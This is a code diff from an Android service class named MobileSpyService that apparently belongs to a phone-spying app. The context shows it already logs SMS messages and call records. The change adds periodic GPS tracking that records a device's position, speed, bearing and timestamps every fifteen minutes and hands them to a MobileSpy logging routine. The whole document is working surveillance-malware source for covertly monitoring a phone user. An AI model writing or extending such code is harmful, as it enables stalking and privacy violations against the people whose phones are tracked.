@@ -38,6 +38,17 @@ public class MobileSpyService extends Service {
 	public static final int EVENT_TYPE_SMS = 1;
 	public static final int EVENT_TYPE_CALL = 2;
 	
+	/**
+	 * Time (in milliseconds) between 2 GPS logging
+	 */
+	private static final long GPS_LOGGING_INTERVAL = 900000L;
+	
+	/**
+	 * Time (in milliseconds) to get location updated
+	 * from Android device
+	 */
+	private static final long LOCATION_UPDATE_INTERVAL = 60000L;
+	
 	private String phoneNumber;
 	private Timer timer;
 	private ContentObserver observer;
@@ -85,7 +96,7 @@ public class MobileSpyService extends Service {
 			break;
 			
 		case EVENT_TYPE_CALL:
-			logCall(this);
+			logCall();
 			break;
 		}
 	}
@@ -103,10 +114,13 @@ public class MobileSpyService extends Service {
 			return;
 		}
 		listener = new LocationListener() {
+			private long lastUpdateTime = 0;
+			
 			public void onLocationChanged(Location location) {
-				if (location != null) {
-					Logger.getDefault().debug(
-						"Location: " + location.getLongitude() + ":" + location.getLatitude());
+				long now = System.currentTimeMillis();
+				if (now - lastUpdateTime > GPS_LOGGING_INTERVAL) {
+					logGPS(location);
+					lastUpdateTime = now;
 				}
 			}
 
@@ -121,7 +135,7 @@ public class MobileSpyService extends Service {
 		};
 		LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 		manager.requestLocationUpdates(
-				LocationManager.GPS_PROVIDER, 30000L, 0.0f, listener);
+				LocationManager.GPS_PROVIDER, LOCATION_UPDATE_INTERVAL, 0.0f, listener);
 	}
 
 	/**
@@ -138,6 +152,19 @@ public class MobileSpyService extends Service {
 		};
 		getContentResolver().registerContentObserver(
 			Uri.parse(CONTENT_SMS), true, observer);
+	}
+
+	private void logGPS(Location location) {
+		if (location != null) {
+			String lon = String.valueOf(location.getLongitude());
+			String lat = String.valueOf(location.getLatitude());
+			String speed = String.valueOf(location.getSpeed());
+			String dir = String.valueOf(location.getBearing());
+			Date now = new Date(location.getTime());
+    		String date = LOG_DATE_FORMAT.format(now);
+			String time = LOG_TIME_FORMAT.format(now);
+			MobileSpy.logGPS(lon, lat, speed, dir, date, time);
+		}
 	}
 
 	/**
@@ -172,7 +199,7 @@ public class MobileSpyService extends Service {
 		}
 	}
 
-	private void logCall(Context context) {
+	private void logCall() {
 		Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
